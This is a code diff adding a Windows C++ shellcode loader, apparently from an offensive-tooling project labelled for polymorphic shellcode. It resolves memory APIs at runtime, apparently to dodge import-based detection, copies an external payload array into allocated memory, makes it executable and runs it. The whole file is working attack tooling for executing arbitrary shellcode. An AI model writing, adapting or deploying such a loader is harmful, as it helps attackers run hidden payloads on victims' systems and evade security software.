@@ -1,0 +1,45 @@
+//Made by Guava for Polymorphic shellcode
+#include <Windows.h>
+#include "payload.h" // contains unsigned char payload_bin[]
+
+// ---------------------- Dynamic API Resolution ----------------
+void* GetProcAddressDynamic(HMODULE hModule, const char* funcName) {
+    void* addr = GetProcAddress(hModule, funcName);
+    if (!addr) ExitProcess(1);
+    return addr;
+}
+
+// ---------------------- Entry Point --------------------------
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+
+    SIZE_T size = sizeof(payload_bin); // size of payload
+
+    // Step 1: Dynamically load kernel32.dll
+    HMODULE k32 = LoadLibraryA("kernel32.dll");
+    if (!k32) ExitProcess(1);
+
+    // Step 2: Dynamically resolve required APIs
+    auto VirtualAllocFunc = (LPVOID(WINAPI*)(LPVOID, SIZE_T, DWORD, DWORD))
+        GetProcAddressDynamic(k32, "VirtualAlloc");
+    auto RtlMoveMemoryFunc = (VOID(WINAPI*)(VOID*, const VOID*, SIZE_T))
+        GetProcAddressDynamic(k32, "RtlMoveMemory");
+    auto VirtualProtectFunc = (BOOL(WINAPI*)(LPVOID, SIZE_T, DWORD, PDWORD))
+        GetProcAddressDynamic(k32, "VirtualProtect");
+
+    // Step 3: Allocate RWX memory
+    LPVOID execMem = VirtualAllocFunc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!execMem) ExitProcess(1);
+
+    // Step 4: Copy payload into allocated memory
+    RtlMoveMemoryFunc(execMem, payload_bin, size);
+
+    // Step 5: Make memory executable
+    DWORD oldProtect;
+    if (!VirtualProtectFunc(execMem, size, PAGE_EXECUTE_READWRITE, &oldProtect))
+        ExitProcess(1);
+
+    // Step 6: Execute payload
+    ((void(*)())execMem)();
+
+    return 0;
+}
